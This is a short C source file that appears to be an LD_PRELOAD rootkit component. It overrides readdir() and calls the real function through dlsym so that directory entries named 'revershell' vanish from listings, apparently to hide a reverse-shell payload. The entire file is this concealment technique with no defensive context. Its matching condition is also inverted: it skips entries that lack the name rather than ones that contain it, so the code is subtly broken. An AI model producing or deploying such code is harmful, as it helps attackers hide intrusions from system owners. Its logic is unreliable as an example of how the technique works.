#include<stdio.h>
#include<dlfcn.h>
#include<string.h>
#include<unistd.h>
#include <dirent.h>

#define HIDDEN_DIR_NAME "revershell"

struct dirent *readdir(DIR *dirp)
{
    struct dirent *dir;
    struct dirent *(*old_readdir)(DIR *dir);  // function pointer

    old_readdir = dlsym(RTLD_NEXT, "readdir");


    dir = old_readdir(dirp);
    if(dir && strstr(dir->d_name, HIDDEN_DIR_NAME)==0){
        dir = old_readdir(dirp);
    }

    return dir;
}
